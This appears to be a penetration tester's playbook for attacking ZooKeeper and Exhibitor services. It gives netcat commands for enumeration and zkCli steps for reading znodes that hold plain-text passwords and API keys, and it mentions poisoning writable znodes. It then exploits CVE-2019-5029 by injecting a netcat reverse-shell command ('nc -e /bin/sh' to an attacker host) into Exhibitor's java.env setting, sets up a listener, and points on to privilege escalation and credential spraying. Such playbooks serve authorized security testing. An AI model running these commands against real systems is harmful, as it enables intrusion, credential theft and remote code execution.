# ZooKeeper and Exhibitor

## Before I start
- [ ] 2181, ZooKeeper, or 8080, Exhibitor, open

## ZooKeeper: four-letter words
echo envi | nc <TargetIP> 2181
echo stat | nc <TargetIP> 2181
echo conf | nc <TargetIP> 2181
echo dump | nc <TargetIP> 2181
- [ ] envi gives the version, host and paths; ruok answers imok when it is alive
- [ ] No login by default: that is how ZooKeeper ships, not a finding by itself

## Read the znodes
zkCli.sh, after sudo apt install -y zookeeper:
/usr/share/zookeeper/bin/zkCli.sh -server <TargetIP>:2181
Then, at its prompt, with THE-ZNODE a path from the listing:
ls /
get THE-ZNODE
- [ ] Applications keep their configuration in znodes: database passwords and API keys, in plain text
- [ ] No ACLs means I can write as well: the services that read them poisoned

## Exhibitor on 8080: CVE-2019-5029
curl -s http://<TargetIP>:8080/exhibitor/v1/config/get-state | jq
searchsploit exhibitor
rlwrap nc -lvnp <LPORT>
- [ ] In the web UI: Config, Editing on, the java.env script set to the line below, then Commit, All At Once
$(/bin/nc -e /bin/sh <LHOST> <LPORT> &)
- [ ] Exhibitor runs whatever is inside $() when it next starts ZooKeeper, which can take up to a minute
- [ ] Versions 1.0.9 to 1.7.1 for the CVE; get-state still shows the configuration with no login where the command does not run

## If it fails
- [ ] 2181 refuses the four-letter words: only the allowed ones answer, and zkCli.sh is still worth a try
- [ ] Exhibitor asks for a login: credentials from the znodes first, which often open it

## Next
- [ ] A shell as exhibitor or zookeeper: :Pb linux-enum, :Pb sudo
- [ ] Application credentials from the znodes: :Pb spraying
